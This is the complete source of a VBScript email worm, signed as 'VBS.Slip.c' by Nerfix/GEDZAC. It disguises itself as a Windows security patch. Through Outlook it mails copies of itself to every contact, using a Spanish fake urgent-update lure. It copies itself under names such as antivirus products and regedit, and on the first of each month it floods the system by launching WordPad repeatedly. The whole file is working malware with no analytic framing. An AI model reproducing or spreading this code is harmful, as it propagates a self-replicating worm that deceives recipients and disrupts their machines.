On Error Resume Next
Set nerfix = CreateObject ("Wscript.Shell")
Set nerfix2 = CreateObject( "Scripting.FileSystemObject ")
If Day (Now) = 1 then
Set nerfix3 = nerfix2.GetSpecialFolder ( 0 )
For X = 1 to 20000
nerfix.Run (nerfix3 & "\" & "wordpad.exe")
X = X + 1
Next
End If
msgbox"Instalando componentes de Windows parche de seguridad Nª2334324"
On Error Resume Next
jcgnrpsxeoeanxg = WScript.ScriptFullName
Set xogcdjxjuoasecu = CreateObject("WScript.Shell") 
If xogcdjxjuoasecu.RegRead("HKCU\Software\system_windows") <> "starup" Then
Set fovjtvilposaimu = CreateObject("Outlook.Application")
If fovjtvilposaimu <> "" Then
Set foywawyvmqnrfap = fovjtvilposaimu.GetNameSpace("MAPI")
For twwfwbdsqnbwyjr = 1 to foywawyvmqnrfap.AddressLists.Count
Set eruqofayhhhpmyh = fovjtvilposaimu.CreateItem(0)
Set hjjgcgvexepxlig = foywawyvmqnrfap.AddressLists.Item(twwfwbdsqnbwyjr)
eruqofayhhhpmyh.Attachments.Add jcgnrpsxeoeanxg
eruqofayhhhpmyh.Subject = "Actualizacion de Windows urgente"
eruqofayhhhpmyh.Body = "Actulizacion critica contra agujeros de seguridad"
eruqofayhhhpmyh.Body = eruqofayhhhpmyh.Body + vbCrLf + "este parche cerrara los puertos abiertos para que no entren hackers a su computadora."
Set gntcaebrthyhhxl = hjjgcgvexepxlig.AddressEntries
Set fbbucrnacfbiywk = eruqofayhhhpmyh.Recipients
For jigctytkhhgbecm = 1 to gntcaebrthyhhxl.Count
eruqofayhhhpmyh.Recipients.Add gntcaebrthyhhxl.Item(jigctytkhhgbecm)
Next
eruqofayhhhpmyh.Send
Next
xogcdjxjuoasecu.RegWrite "HKCU\Software\system_windows", "starup" 
End If
End If
Sub Copiarasimismo()
dim fso, eq, ctr, file, vbscopy
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy("C:\windows\spip.vbs")
c.Copy("C:\windows\system\slip_b.exe")
c.Copy("C:\windows\system\nerfix.exe")
c.Copy("C:\windows\system\xpload.exe")
c.Copy("C:\windows\system\kuasanagui.exe")
c.Copy("C:\windows\system\neodrako.exe")
c.Copy("C:\windows\system\nemesixx.exe")
c.Copy("C:\windows\system\zirkov.exe")
c.Copy("C:\windows\system\jefaso.exe")
c.Copy("C:\windows\system\egrone.exe")
c.Copy("C:\windows\system\regedit.exe")
c.Copy("C:\windows\system\dr.neo.exe")
c.Copy("C:\windows\system\vbs.slip.b.exe")
c.Copy("C:\windows\system\ip.exe")
c.Copy("C:\windows\system\regedit.exe")
c.Copy("C:\windows\system\anti-virus.exe")
c.Copy("C:\windows\system\Norton.exe")
c.Copy("C:\windows\system\AVP.exe")
c.Copy("C:\windows\system\Mcafee.exe")
c.Copy("C:\windows\system\panda.exe")
c.Copy("C:\windows\system\per.exe")
c.Copy("C:\windows\system\loock_down.exe")
c.Copy("C:\windows\system\bitdefender.exe")
c.Copy("C:\windows\system\pccillin.exe")
c.Copy("C:\windows\system\regedit.exe")	
c.Copy("C:\windows\system\windows.exe")
c.Copy("C:\windows\system\up.exe")	
c.Copy("C:\windows\system\starup.exe")
c.Copy("C:\windows\system\shell.exe")
c.Copy("C:\windows\system\slip.c.exe")
c.Copy("C:\windows\system\group.exe")
c.Copy("C:\windows\system\outlook.exe")
c.Copy("C:\windows\system\stand.exe")
c.Copy("C:\windows\system\lie.exe")
c.Copy("C:\windows\system\whaiting.exe")
c.Copy("C:\windows\system\plague.exe")
c.Copy("C:\windows\system\mIRC.exe")
c.Copy("C:\windows\system\msn.exe")	
c.Copy("C:\windows\system\aol.exe")
c.Copy("C:\windows\system\ICQ.exe")
c.Copy("C:\windows\system\430958i40959.exe")	
c.Copy("C:\windows\system\slipknot.exe")
c.Copy("C:\windows\system\curas.exe")
end sub
'VBS.Slip.c
'CREATED BY NERFIX/GEDZAC